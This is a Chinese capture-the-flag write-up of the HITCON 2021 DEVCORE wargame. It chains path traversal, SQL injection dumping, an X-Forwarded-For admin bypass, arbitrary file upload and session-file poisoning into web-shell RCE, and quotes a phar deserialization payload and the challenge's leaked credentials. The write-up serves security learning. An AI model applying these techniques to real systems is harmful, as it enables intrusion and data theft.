---
title: HITCON 2021 x DEVCORE Wargame 解題心得
catalog: true
date: 2021-11-30 23:08:40
tags: [Security]
categories: [Security]
---

這次 HITCON 2021 DEVCORE 有弄了一個 wargame 出來，說明在這邊：https://hackmd.io/@d3vc0r3/hitcon2021

上面寫著兩小時內可解完，想說就來玩玩看好了，殊不知學藝不精導致最後有個地方卡了超久，不過扣除那個地方以外，難度確實不高，這篇簡單記錄一下解題的過程跟心得。

<!-- more -->

## 解題筆記

挑戰網址（可能已經關閉）：http://web.ctf.devcore.tw/

進去網站之後很明顯可看到 image.php 有個 path traversal 的洞，可以讀到任意檔案，只要把路徑用 base64 encode 過即可:

![](/img/devcore-wargame/p1.jpg)

先來讀一下 `/etc/passwd`：

```
123root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
# find PHP source code and you will get the flag.
```

提示說只要能找到 PHP source code 就可以拿到第一個 flag，這時候嘗試了一些預設的 PHP 路徑但一無所獲，想起上禮拜看的 [Balsn CTF 2021 WriteUps](https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/)，知道一個神奇的路徑 `file:///proc/self/cwd`，於是就去讀 `/proc/self/cwd/index.php`，順利讀到 index.php 的檔案內容！

根據檔案 include 的東西繼續去找，可以找到其他相關的檔案：

1. error.php
2. image.php
3. include.php
4. index.php
5. lang.php
6. order.php
7. pdf.php
8. print.php
9. qrcode.php
10. rate-limit.php
11. receipt.php
12. submit.php
13. success.php

在 inlcude.php 裡面順利拿到第一個 flag：

``` php
<?php

/*
                  _     ___   ___  _  __                
 __   __ __   __ | |   / _ \ / _ \| |/ / __   __ __   __
 \ \ / / \ \ / / | |  | | | | | | | ' /  \ \ / / \ \ / /
  \ V /   \ V /  | |__| |_| | |_| | . \   \ V /   \ V / 
   \_/     \_/   |_____\___/ \___/|_|\_\   \_/     \_/  
                                                        

   DEVCORE{no.1_path_traverse_to_the_m00n}

 */


define('IMAGE_PATH', '/usr/share/nginx/images/');

define('MYSQL_HOST', 'mysql');
define('MYSQL_USER', 'web_user');
define('MYSQL_PASSWORD', 'n%6GZgt*hH[+p7vJ');
define('MYSQL_DATABASE', 'web');

define('ORDER_STATUS_PICKING', 'PICKING');
define('ORDER_STATUS_PACKING', 'PACKING');
define('ORDER_STATUS_SENDING', 'SENDING');
define('ORDER_STATUS_DELIVERING', 'DELIVERING');
define('ORDER_STATUS_ARRIVED', 'ARRIVED');
define('ORDER_STATUS_FINISH', 'FINISH');

define('DEFAULT_LANGUAGE', 'zh-tw');
define('ALLOWED_LANGUAGE', 'zh-tw');

function session_start_once() {
    if (!isset($_SESSION)) { 
        session_start();
    }
}

session_start_once();


if (!isset($_SESSION['lang'])) {
    $_SESSION['lang'] = DEFAULT_LANGUAGE;
}

require_once('langs/' . $_SESSION['lang'] . '.php');

require_once('qrcode.php');

function base64_urlsafe_encode($input) {
    return strtr(base64_encode($input), '+/', '._');
}

function base64_urlsafe_decode($input) {
    return base64_decode(strtr($input, '._', '+/'));
}


$GLOBALS['_pdo'] = false;

function get_pdo() {
    if ($GLOBALS['_pdo']) {
        return $GLOBALS['_pdo'];
    }
    try {
        $pdo = new PDO(
                    'mysql:host='.MYSQL_HOST.';dbname='.MYSQL_DATABASE.';charset=utf8mb4',
                    MYSQL_USER, MYSQL_PASSWORD,
                    array(
                        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES \'utf8mb4\' COLLATE \'utf8mb4_unicode_ci\';',
                        PDO::ATTR_TIMEOUT => 2
                    ));
        $GLOBALS['_pdo'] = $pdo;
    } catch (Exception $e) {
        http_response_code(500);
        die("Failed to connect database. Please contact the administrtor.");
    }
    return $pdo;
}

function get_post_param($key, $default=null) {
    if (isset($_POST[$key])) {
        return $_POST[$key];
    } else {
        return $default;
    }
}

function get_get_param($key, $default=null) {
    if (isset($_GET[$key])) {
        return $_GET[$key];
    } else {
        return $default;
    }
}

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function random_str(
    int $length = 64,
    string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
): string {
    if ($length < 1) {
        throw new \RangeException("Length must be a positive integer");
    }
    $pieces = [];
    $max = mb_strlen($keyspace, '8bit') - 1;
    for ($i = 0; $i < $length; ++$i) {
        $pieces []= $keyspace[random_int(0, $max)];
    }
    return implode('', $pieces);
}

function get_sig_hash($data) {
    $pdo = get_pdo();
    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'sig_secret' LIMIT 1", PDO::FETCH_ASSOC);
    $row = $res->fetch();
    if (!$row) {
        $secret = random_str(64);
        $pdo->exec("INSERT INTO options VALUES ('sig_secret', '".$secret."'), ('sig_algorithm', 'sha256')");
    } else {
        $secret = $row['value'];
    }
    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'sig_algorithm' LIMIT 1", PDO::FETCH_ASSOC);
    $algo = $res->fetch()['value'];
    return hash_hmac($algo, $data, $secret);
}

function get_timezone() {
    $pdo = get_pdo();
    $res = $pdo->query("SELECT `value` FROM options WHERE `key` = 'timezone' LIMIT 1", PDO::FETCH_ASSOC);
    $row = $res->fetch();
    if (!$row) {
        $pdo->exec("INSERT INTO options VALUES ('timezone', 'Asia/Taipei')");
        $timezone = 'Asia/Taipei';
    } else {
        $timezone = $row['value'];
    }
    return $timezone;
}

define('TIMEZONE', get_timezone());
date_default_timezone_set(TIMEZONE);

function endsWith( $haystack, $needle ) {
    $length = strlen( $needle );
    if( !$length ) {
        return true;
    }
    return substr( $haystack, -$length ) === $needle;
}


function order_status_to_text($status) {
    $text_arr = [
        ORDER_STATUS_PICKING => '撿貨',
        ORDER_STATUS_PACKING => '包裝中',
        ORDER_STATUS_SENDING => '等待貨運士取貨',
        ORDER_STATUS_DELIVERING => '配送中',
        ORDER_STATUS_ARRIVED => '貨物已送達',
        ORDER_STATUS_FINISH => '完成'
    ];
    return $text_arr[$status];
}
```

接著看了一下各個檔案，發現 `print.php` 有個很明顯的 SQL Injection：

``` php
<?php

require_once('include.php');
require_once('third_party/vendor/autoload.php');

//require_once('rate_limit.php');
// rate limit is not working, use random sleep as a workaround
sleep(random_int(0, 2));

$is_from_print = true;

$id = get_get_param('id', '');
$sig = get_get_param('sig', '');
$sig_hash = get_sig_hash($sig);
$pdo = get_pdo();
$res = $pdo->query("
    SELECT *
    FROM orders 
    WHERE sig_hash = '$sig_hash' AND id = $id
    LIMIT 1
", PDO::FETCH_ASSOC);

try {
    $order = $res->fetch();
} catch (Error $e) {
    $order = [];
}

ob_start();
include('pdf.php');
$html = ob_get_clean();

$mpdf = new \Mpdf\Mpdf([
    'tempDir' => '/tmp',
    'autoScriptToLang' => true,
    'autoLangToFont' => true,
    'mode' => 'utf-8'
]);
$mpdf->SetTitle('收據明細');
$mpdf->SetSubject('收據明細');
$mpdf->SetAuthor(random_str((random_int(1, 256))));
$mpdf->SetCreator(random_str((random_int(1, 256))));
$mpdf->WriteHTML($html);
$mpdf->Output();
```

手動 injection 一下之後可得到下列資訊：

```
table: rate_limit
ip,last_visit,visit_times

table: items
id,title,description

table: options
key,value

table: backend_users
id,username,password,description
admin u=479_p5jV:Fsq(2

table: orders
id,name,email,phone,status,sig_hash,order_date,address,note
```

由於只能弄出一列資料，可利用 `GROUP_CONCAT` 幫忙 dump 資料，像這樣：`SELECT 1,GROUP_CONCAT(note),GROUP_CONCAT(name),GROUP_CONCAT(email),5,6,7,8,9 FROM orders
`
在 DB 裡面應該是 backend_users 的地方找到了第三個 flag（對，是第三個不是第二個）以及一組帳密，預期之後可能會用到

此時根據剛剛的 `include.php`，得到這個路徑：`third_party/vendor/autoload.php`，很明顯就有用 composer，所以可以去讀 `/proc/self/cwd/third_party/composer.json`，得知只有用一個叫做 mpdf 的套件。

接著來搜尋一下有沒有已知漏洞，找到官方的這個 issue，是由 DEVCORE 的人回報的：[phar:// deserialization and weak randomness of temporary file name may lead to RCE](https://github.com/mpdf/mpdf/issues/1381)

從這個 issue 可以得知兩件事情：

1. 我們可以寫入檔案到 /tmp/mpf/_tempCSSidataX_0.jpeg
2. 可以利用 `<img src="#1.jpeg" ORIG_SRC="phar://../vendor/mpdf/mpdf/tmp/mpdf/_tempCSSidata1_0.jpeg/a.jpg"></img>` 進行反序列化

但問題來了，要反序列化去觸發攻擊的話需要找到可以利用的 gadget，我在 local 裝了一樣的套件之後，直接在 third_party 資料夾底下搜了 __ 開頭的 method，只有很無用的一些東西，怎麼想都湊不出來 POP 攻擊鍊。

於是我就卡關了。

我想了又想，看了又看，除了這個 phar 的洞有機會打以外，剩下的大概就是 `include.php` 裡面引入 `$_SESSION['lang']` 的部分，如果可以控制 lang 的話就可以引入任意檔案，但問題是 `lang.php` 裡面對於參數的控制沒有洞可以打，除非我們可以直接去改 `/tmp/sess_XXX`，否則打不進去。

但目前唯一可以寫檔的漏洞只有 mpdf 那個，可是檔名有限制，無法寫去任意地方，否則就可以把兩者融合一下。

再來還有一個地方怎麼看怎麼怪，就是我在 DB 裡面打到一組 backend 帳號密碼，照理來說應該要有個後台才對，可以後台在哪裡？

原本在做這種 wargame 或是 CTF 的時候通常都不太需要列舉，但因為真的沒招所以我只好開始爆搜一波，用 ffuf 掃一下任何我覺得有可能的地方，但是一無所獲，所以我就沒招了，完全不知道下一步該如何是好。

這次的 wargame 是週六早上九點開始，我在十點的時候解完上面講的那兩個 flag，然後就卡了一整天。當天晚上我看了一下，解完的只有 6 個人但是 NFT 有好多個，就去聊天室問了一下如果解題狀況不如預期，有沒有打算放出一些提示，後來得到回覆說需要哪方面的資訊。

因為當初規定的解題時間是到週日晚上六點（HITCON 結束），所以我想說等到結束以後再來問提示，就說明了自己的狀況（解完 1 跟 3 以後卡關），後來得到的回覆是可以從弱點 1 再次觀察一下有沒有後台之類的東西。

於是我再次嘗試了各種路徑，最後試到一個我以前有看過但我居然沒試到的東西：`/proc/mounts`，內容長這樣：

```
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/DVIDOZY6PBLWVCFYWII5AAUIJZ:/var/lib/docker/overlay2/l/3CV53MMJRHWIZWOHD5WPBJANGZ:/var/lib/docker/overlay2/l/VIRCM74GAO2ULIS6SHAVLYHI7O:/var/lib/docker/overlay2/l/QC5SROY6OOIX6VQUNGJG3T5GMY:/var/lib/docker/overlay2/l/3Z7BTZXFISPKXE3DEG4OUPAB5G:/var/lib/docker/overlay2/l/GDBX5T35WQSMHIY2USJLX6SPRU:/var/lib/docker/overlay2/l/WHFI4IRDVNIOO6MLKCKKAMYQKB:/var/lib/docker/overlay2/l/JLXT6H6QNKB45UIDZANGKVGLPD:/var/lib/docker/overlay2/l/M756SQ7NRKEJCKLHPB2PRKG5Z2:/var/lib/docker/overlay2/l/OY2PWIL6ISIIORC7LZNWWQ6JKN:/var/lib/docker/overlay2/l/GXC3IEBX7YVRSOMH34OAE6Y5LV:/var/lib/docker/overlay2/l/FNJ3ZWM4WCOCANHBZPBTO47K5B:/var/lib/docker/overlay2/l/NRVSBMR3SAZ3PNE5KXGMUQMODK:/var/lib/docker/overlay2/l/2MARFWCP5GVEAG5IBUMLJTABKL:/var/lib/docker/overlay2/l/F67HXFSPANXFWKRP2R5YJHJRBE:/var/lib/docker/overlay2/l/AKYB2LUEDDQPLGHVXECL72U4MK:/var/lib/docker/overlay2/l/B7CFODJXDKC3HEX5ZJD7NAID5A:/var/lib/docker/overlay2/l/5XQVILRBQTSFRMEKB7YW6UTYLB:/var/lib/docker/overlay2/l/6ZMT3PTB6QFDZ2PJOURGMQZIMJ:/var/lib/docker/overlay2/l/4AUQ72KT7D5WLPX3GCGBI576ZS:/var/lib/docker/overlay2/l/HEF7KMRLHAUNHLXAPU5T4QFJJD:/var/lib/docker/overlay2/l/ZEPQYM2UZQKKXKJS62CP5RIRKN:/var/lib/docker/overlay2/l/4BBAOHRGSZ3TVLTD4ZICVZS7C7:/var/lib/docker/overlay2/l/3K7P7JABJCB4HT5HZRXGBFSSAU:/var/lib/docker/overlay2/l/GUW5ZGQOABGYH7KF5IU5JFHG6E:/var/lib/docker/overlay2/l/RKL5CJMH6X7ORW4XAB5HJ3RJ3C:/var/lib/docker/overlay2/l/ZLWG5Z6C6FD3OQEJCZHJHODTTX:/var/lib/docker/overlay2/l/QLSXNQZKZQQ3YDAFJ675RXRFWL:/var/lib/docker/overlay2/l/KHQSPHLSLWASTCLEBPKWK7AABD:/var/lib/docker/overlay2/l/GCM3GAH2MB2FBUK2NUGCCQ6H6R:/var/lib/docker/overlay2/l/FVHE6ZGSGB26C3JN35T36U575B:/var/lib/docker/overlay2/l/A3B3RQ7O6RTEZTZDFCBNL3R2IG:/var/lib/docker/overlay2/l/VWEM5H2WW7HEKTCLCWBPPEV4RA:/var/lib/docker/overlay2/l/QAYAOZL2DM73CJVN7Y3J7MRXDP:/var/lib/docker/overlay2/l/CGI6OQSFKKJRGSKZASWCHJDJIM,upperdir=/var/lib/docker/overlay2/ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b/diff,workdir=/var/lib/docker/overlay2/ea857d9fda05b6fb0c5b7d79544f8d05943163aec8ecce2c8aaede2a93bd0b1b/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/rdma cgroup ro,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/scsi tmpfs ro,relatime 0 0
tmpfs /sys/firmware tmpfs ro,relatime 0 0
```

裡面可以直接看到幾個重要路徑：

```
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
```

沒錯，我一開始就漏掉了這個，就是因為這個卡了一整天 QQ

找到這個之後就變得容易了起來，進到 `b8ck3nd/index.php` 的時候直接被導回首頁，想起之前在 `include.php` 看到的一些 utils funtion，試著加入 `X-Forwarded-For: 127.0.0.1` 就可以 bypass，導去登入頁面，登入帳密就用之前 SQL injection 打出來的那組，登入成功後就順利拿到第四個 flag。

![](/img/devcore-wargame/p2.png)

接著可以在 backend 找到一個 upload.php，可以上傳任意檔案：

``` php
<?php

require_once('include.php');

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    header('Content-Type: text/plain');
    echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk';
    exit();
}

if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
    header('Content-Type: application/json; charset=utf-8');
    $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    $filename = random_str(32).'.'.$ext;
    if (isset($_POST['rename'])) {
        $filename = $_POST['rename'];
    }
    if (isset($_POST['folder'])) {
        $folder = $_POST['folder'];
        if (!file_exists(IMAGE_PATH.$folder)) {
            mkdir(IMAGE_PATH.$folder);
        }
        $filename = $folder.'/'.$filename;
    }
    $filepath = IMAGE_PATH . $filename;
    move_uploaded_file($_FILES['file']['tmp_name'], $filepath);
    system("rsync_wrap ".escapeshellarg($filepath));
    $id = base64_urlsafe_encode($filename);
    echo json_encode([
        'default' => '/image.php?id='.$id
    ]);
} else {
    http_response_code(400);
}
```

先試著上傳到 `../../../../../usr/share/nginx/frontend` 看看，就得到了第五組 flag：

![](/img/devcore-wargame/p3.png)

但實際試了一下發現檔案其實沒寫進去，也嘗試了其他路徑，例如說 `b8ck3nd`，或我有想說會不會是要寫進去 `/usr/share/nginx/frontend/third_party/vendor` 然後搭配前面提到的 mpdf 觸發 phar 漏洞（感覺滿合理的），但這邊也寫不進去。

或是寫進 `langs` 裡面搭配切換語系來引入檔案，但這邊也寫不進去。

想了一陣子之後嘗試寫到 `/tmp`，這邊倒是沒問題，於是答案就很明顯了，先寫一個檔案 `/tmp/test1234.php`，然後再寫一個 `/tmp/sess_abc`，因為可以操控 session 檔案內容，於是就可以自己填入想要的 lang，操控 `$_SESSION['lang']` 的值，搭配最開始提到的 `include.php` 引入自己寫的 web shell，就可以 RCE 了。

RCE 以後就可以在根目錄執行 `/readflag` 讀到 flag。

於是六把 flag 我獨缺第二把，其他都完成了，但最後那把到底在哪裡？我拿到 shell 之後有去裡面稍微翻了一下，原本猜說可能是在 nginx config 裡面，但怎麼找都沒找到（話說即使玩到最後我都沒找到 nginx config 在哪）。

又過了大概半小時，flag 出現的順序應該會跟解題的順序跟難易度差不多，既然第一把是 Path Traversal，第三把是 SQL injection，就代表第二把應該是出現在兩個中間才對，於是我突然有了個想法，心裡想著「不會吧...」

然後前往 http://web.ctf.devcore.tw/order.php?id=1&sig[]=1

第二把 flag 就這樣出現在我眼前了

![](/img/devcore-wargame/p4.png)

## 總結

最後來檢討一下這次碰到的問題。

第一個最嚴重的問題就是讀檔那邊沒有找到關鍵檔案，導致後續整個卡死。

以後碰到這種可以讀本地檔案的漏洞，應該要自己建個字典檔，不然每次都要 google 半天有哪些可以讀，之後來寫一篇整理一下好了。

第二個問題是沒注意到第二把 flag，其實 sql injection 的時候如果該拿的資料都有拿完，應該也是看得到，所以以後記得可以把 db 整個 dump 出來。

總之我覺得還是滿好玩的，感謝 DEVCORE 的 wargame，而最後也因為挑戰時間有延長一點，順利拿到了 DEVCORE 發的挑戰者 NFT！

![](/img/devcore-wargame/p5.png)

